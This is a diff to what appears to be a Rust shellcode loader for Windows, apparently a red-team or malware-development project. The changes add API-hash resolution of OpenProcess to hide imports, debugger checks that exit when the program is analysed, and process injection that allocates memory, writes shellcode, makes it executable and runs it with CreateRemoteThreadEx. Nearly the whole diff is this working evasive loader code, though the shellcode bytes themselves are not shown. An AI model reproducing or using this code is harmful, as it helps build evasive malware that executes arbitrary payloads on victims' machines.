@@ -24,7 +24,7 @@ type TOpenProcess = unsafe extern "system" fn(
     dwdesiredaccess: PROCESS_ACCESS_RIGHTS,
     binherithandle: BOOL,
     dwprocessid: u32
-) -> Result<HANDLE>;
+) -> HANDLE;
 
 type TCheckRemoteDebuggerPresent = unsafe extern "system" fn(
     hprocess: HANDLE,
@@ -94,7 +94,7 @@ fn getHashFromFunc(funcName: &str) -> u32 {
     hash
 }
 
-fn getFuncAddressByHash(lib: &str, hash: u32) -> *const u32{
+fn getFuncAddressByHash(lib: &str, hash: u32) -> *const u32 {
     unsafe {
 
         let lib_ptr: PCSTR = PCSTR::from_raw(format!("{}\0", lib).as_ptr());
@@ -103,6 +103,7 @@ fn getFuncAddressByHash(lib: &str, hash: u32) -> *const u32{
 
         match libBase {
             Ok(h) => {
+                println!("\n\n");
                 let base_ptr: *const u8 = h.0 as *const u8;
                 println!("[+] Module Handle: {:?}", base_ptr);
                 
@@ -193,18 +194,93 @@ fn main() {
 
     let pid = process::id();
 
-    unsafe {
-
-        let func_addr: *const u32 = getFuncAddressByHash("kernel32.dll", 0x9e08d0);
-
-        //if func_addr.is_null() {
-        //    process::exit(-1);
-        //}
-        
-        //let XOpenProcess: TOpenProcess = mem::transmute(func_addr);
-        
+    unsafe {        
         println!("[i] Trying to open a Handle for the Process {pid}");
-        match OpenProcess(PROCESS_ALL_ACCESS, false, pid) {
+        
+        let XOpenProcess: TOpenProcess = mem::transmute(getFuncAddressByHash("kernel32.dll", 0x9e08d0) as *const u32);
+        let hprocess = XOpenProcess(PROCESS_ALL_ACCESS, false.into(), pid);
+
+        let mut debugger_present: BOOL = BOOL(0);
+
+        if CheckRemoteDebuggerPresent(hprocess, &mut debugger_present as *mut BOOL).is_ok() && debugger_present.as_bool() {
+            process::exit(-1);
+        }
+
+        if IsDebuggerPresent().as_bool(){
+            process::exit(-1);
+        }
+
+        let haddr = VirtualAllocEx(
+            hprocess,
+            Some(null_mut()),
+            shellcode.len(),
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE,
+        );
+
+        if haddr.is_null() {
+            eprintln!("[!] Failed to Allocate Memory in Target Process.");
+            let _ = CloseHandle(hprocess);
+            process::exit(-1)
+        }
+
+        println!("[i] Writing to memory at address {:p}", haddr);
+        WriteProcessMemory(
+            hprocess,
+            haddr, 
+            shellcode.as_ptr() as _,
+            shellcode.len(),
+            None,).unwrap_or_else(|e| {
+                eprintln!("[!] WriteProcessMemory Failed With Error: {}", e);
+                let _ = CloseHandle(hprocess);
+                process::exit(-1);
+            }
+        );
+
+        let mut oldprotect: PAGE_PROTECTION_FLAGS = PAGE_PROTECTION_FLAGS(0);
+        VirtualProtectEx(
+            hprocess,
+            haddr,
+            shellcode.len(),
+            PAGE_EXECUTE_READWRITE,
+            &mut oldprotect,).unwrap_or_else(|e| {
+            eprintln!("[!] VirtualProtectEx Failed With Error: {}", e);
+            let _ = CloseHandle(hprocess);
+            process::exit(-1);
+        });
+        
+        println!("[+] Creating a Remote Thread");
+        let hthread = CreateRemoteThreadEx(
+            hprocess,
+            Some(null()),
+            0,
+            Some(std::mem::transmute(haddr)),
+            Some(null()),
+            0,
+            None,
+            Some(null_mut()),).unwrap_or_else(|e| {
+                eprintln!("[!] CreateRemoteThreadEx Failed With Error: {}", e);
+                let _ = CloseHandle(hprocess);
+                process::exit(-1);
+            }
+        );
+
+        WaitForSingleObject(hthread, INFINITE);
+
+        let _ = CloseHandle(hthread);
+        println!("[i] Closed thread handle");
+
+        let _ = CloseHandle(hprocess);
+        println!("[i] Closed process handle");
+
+        let _ = VirtualFree(haddr, 0, MEM_RELEASE);
+        println!("[i] Memory released");
+
+
+        println!("[+] Executed!");
+                
+
+        /* match XOpenProcess(PROCESS_ALL_ACCESS, false.into(), pid) {
             Ok(hprocess) => 'p: {
                 let mut debugger_present: BOOL = BOOL(0);
 
@@ -286,9 +362,9 @@ fn main() {
                 println!("[+] Executed!");
                 break 'p;
             }
-            Err(pid) => {
-                eprintln!("[!] Error Getting Process Identifier {pid}");
+            Err(e) => {
+                eprintln!("[!] Error Getting Process Identifier {e}");
             }
-        }
+        } */
     }
 }
